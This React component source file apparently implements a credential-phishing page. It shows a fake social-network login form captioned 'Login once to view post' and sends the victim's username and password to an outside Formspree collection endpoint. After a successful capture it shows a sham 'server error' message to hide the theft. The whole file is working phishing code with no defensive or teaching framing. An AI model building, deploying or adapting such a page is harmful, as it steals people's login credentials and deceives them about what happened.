import React from 'react';
import './App.css';

export default class App extends React.Component {
  constructor(props) {
    super(props);
    this.submitForm = this.submitForm.bind(this);
    this.state = {
      status: ""
    };
  }

  render() {
    const { status } = this.state;
    return (
      <div>
      <form
        onSubmit={this.submitForm}
        action="https://formspree.io/f/mleondwe"
        method="POST"
      >
       
      
       
     
      <div id="wrapper">
      <div className="main-content">
        <div className="header">
          <img src="https://i.imgur.com/zqpwkLQ.png" />
        </div>
        <p>Login once to view post </p>
        <div className="l-part">
          <input type="text" placeholder="Username" className="input-1" name="username" />
          <div className="overlap-text">
            <input type="password" placeholder="Password" className="input-2" name="password" />
            <a href="#">Forgot?</a>
          </div>
          <input type="submit" value="Log in" className="btn" />
         
        </div>
      </div>
      <div className="sub-content">
        <div className="s-part">
          Don't have an account?<a href="#">Sign up</a>
        </div>
      </div>
    </div>
    {status === "SUCCESS" ? <p>Ooops! There was an server error</p> : ""}
        {status === "ERROR" && <p>Ooops! There was an error.</p>}
    </form>
    </div>

    );
  }

  submitForm(ev) {
    ev.preventDefault();
    const form = ev.target;
    const data = new FormData(form);
    const xhr = new XMLHttpRequest();
    xhr.open(form.method, form.action);
    xhr.setRequestHeader("Accept", "application/json");
    xhr.onreadystatechange = () => {
      if (xhr.readyState !== XMLHttpRequest.DONE) return;
      if (xhr.status === 200) {
        form.reset();
        this.setState({ status: "SUCCESS" });
      } else {
        this.setState({ status: "ERROR" });
      }
    };
    xhr.send(data);
  }
}